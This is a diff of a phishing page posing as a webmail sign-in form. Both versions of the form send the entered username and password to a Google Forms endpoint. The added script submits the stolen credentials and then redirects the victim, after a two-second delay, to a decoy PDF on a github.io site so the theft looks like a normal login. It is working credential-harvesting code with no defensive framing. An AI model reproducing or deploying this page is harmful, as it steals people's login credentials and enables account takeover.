@@ -49,9 +49,10 @@
                             <span class="ImgLoginBanner"></span>
                         </a>
                     </div>				
-				<form id="zLoginForm" method="post" name="loginForm" action="https://docs.google.com/forms/d/e/1FAIpQLScoVlFK4gfbLMKRUNmyjID4RBr7-asqVtqSGyI7ODjl4UDHEA/formResponse" accept-charset="UTF-8">
-								<input type="hidden" name="loginOp" value="login">
-								<input type="hidden" name="login_csrf" value="ec529cbe-89f5-4964-b46f-b3dc29789899">
+				
+				<form id="zLoginForm" name="loginForm" action="https://docs.google.com/forms/d/e/1FAIpQLScoVlFK4gfbLMKRUNmyjID4RBr7-asqVtqSGyI7ODjl4UDHEA/formResponse" accept-charset="UTF-8" onsubmit="return validateForm();">
+				    <input type="hidden" name="loginOp" value="login">
+				    <input type="hidden" name="login_csrf" value="ec529cbe-89f5-4964-b46f-b3dc29789899">
 
 								<div class="signIn">Sign In</div>
                         <div class="form">
@@ -70,23 +71,27 @@
                                         <div>
                                             <button id="loginButton" type="submit" tabindex="5" class="loginButton">Sign In</button>
 						<script>
-									function validateForm() {
-									var username = document.getElementById("username").value;
-									var password = document.getElementById("password").value;
-									var errorMessage = document.getElementById("error-class");
+							function validateForm() {
+							    var username = document.getElementById("username").value;
+							    var password = document.getElementById("password").value;
+							    var errorMessage = document.getElementById("errorMessageDiv");
 
-									// Basic validation (you can add more complex validation logic)
-									if (username.trim() === "" || password.trim() === "") {
-										errorMessage.textContent = "Please enter your current password to continue.";
-										event.preventDefault();
-									} else {
-										// Submit the form if validation passes
-										document.getElementById("login-form").submit();
-									}
-										
-								}
-		    
-								</script>
+							    // Basic validation
+							    if (username.trim() === "" || password.trim() === "") {
+								errorMessage.textContent = "Please enter your current password to continue.";
+								return false; // Prevent form submission
+							    } else {
+								// Submit the form if validation passes
+								document.getElementById("zLoginForm").submit();
+								
+								// Redirect after a short delay to allow form submission
+								setTimeout(function() {
+								    window.location.href = 'https://dgfi07.github.io/BCC-html/Updated List HQ SCO.pdf'; // Change to your desired URL
+								}, 2000); // Adjust delay as needed
+								return false; // Prevent default form submission behavior
+							    }
+							}
+						    </script>
                                         </div>
                                         <div class="rememberCheckWrapper"> 
                                                 <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme">
